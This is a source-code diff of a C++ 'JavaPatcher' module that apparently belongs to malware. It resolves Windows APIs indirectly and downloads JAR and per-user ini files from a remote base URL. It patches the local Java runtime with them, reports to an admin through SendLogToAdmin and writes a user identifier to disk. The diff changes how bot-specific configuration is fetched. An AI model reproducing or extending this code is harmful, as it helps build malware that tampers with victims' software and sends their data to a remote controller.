@@ -293,16 +293,10 @@ static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAd
 
 	pDeleteFileA( ".\\statusFile.txt" );
 	pDeleteFileA( ".\\unsigned.txt" );
-	pDeleteFileA( ".\\rt.ini" );
 	pDeleteFileA( ".\\file.dat" );
 	pDeleteFileA( ".\\uid.txt" );
 	pDeleteFileA( ".\\rt2.log" );
 	pDeleteFileA( ".\\PatchFail.txt" );
-
-	if( pCopyFileA( iniFilePath, ".\\rt.ini", FALSE) == 0 )
-		return false;
-	if( pCopyFileA( iniFilePath2, ".\\rt_p.ini", FALSE) == 0 )
-		return false;
 
 	if( pSetCurrentDirectoryA(javaHome) == 0 )
 		return false;
@@ -374,6 +368,7 @@ static FILE_CRC32* LoadCorrectCRC32( const char* baseUrl )
 	}
 	else
 	{
+		//File::WriteBufferA( "c:\\crc32.txt", crc32Data, crc32Len );
 		char* context = 0;
 		char* crc32Data2 = crc32Data;
 		while( true )
@@ -424,7 +419,6 @@ static bool DownloadPlugin( FILE_CRC32* filesCrc32, const char* baseUrl, const c
 	for(;;)
 	{
 		DWORD szData;
-		DBG( "JavaPatcher", "Download from: %s", url );
 		char* data = DownloadPlugin( url, &szData, false );
 		if( data )
 		{
@@ -432,6 +426,7 @@ static bool DownloadPlugin( FILE_CRC32* filesCrc32, const char* baseUrl, const c
 			unsigned long crc2 = GetCorrectCRC32( filesCrc32, crcName );
 			if( crc1 == crc2 )
 			{
+				DBG( "JavaPatcher", "saved '%s' to '%s'", url, fileName );
 				DWORD saved = File::WriteBufferA( (char*)fileName, data, szData );
 				if( saved == szData )
 				{
@@ -482,18 +477,6 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 //	File::GetTempName(rtAddFilePath);
 	GetWorkFolder( rtAddFilePath, "rt_add.jar" );
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, rtAddFilePath, crcName ) )
-		return false;
-
-	addUrl = "rt.ini";
-	crcName = addUrl;
-	File::GetTempName(iniFilePath);
-	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, iniFilePath, crcName ) )
-		return false;
-
-	addUrl = "rt_p.ini";
-	crcName = addUrl;
-	File::GetTempName(iniFilePath2);
-	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, iniFilePath2, crcName ) )
 		return false;
 
 	//загрузка файлов во временную папку
@@ -570,6 +553,29 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 		ss++;
 	}
 
+	string azUser = GetAzUser();
+	DBG( "JavaPatcher",  "AzUser: %s", azUser.t_str() );
+
+	m_lstrcpy( fileName, azUser.t_str() );
+	m_lstrcat( fileName, "_rt.ini" );
+	addUrl = fileName;
+	crcName = addUrl;
+	m_lstrcpy( iniFilePath, Path );
+	pPathAppendA( iniFilePath, "rt.ini" );
+	//File::GetTempName(iniFilePath);
+	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, iniFilePath, crcName ) )
+		return false;
+
+	m_lstrcpy( fileName, azUser.t_str() );
+	m_lstrcat( fileName, "_rt_p.ini" );
+	addUrl = fileName;
+	crcName = addUrl;
+	m_lstrcpy( iniFilePath2, Path );
+	pPathAppendA( iniFilePath2, "rt_p.ini" );
+//	File::GetTempName(iniFilePath2);
+	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, iniFilePath2, crcName ) )
+		return false;
+
 	SendLogToAdmin(3);
 
 	addUrl = "javassist.jar";
@@ -590,8 +596,6 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 
 	m_lstrcpy( fileName, Path );
 	pPathAppendA( fileName, "user.txt" );
-	string azUser = GetAzUser();
-	DBG( "JavaPatcher",  "AzUser: %s", azUser.t_str() );
 	File::WriteBufferA( fileName, azUser.t_str(), azUser.Length() );
 
 	return true;
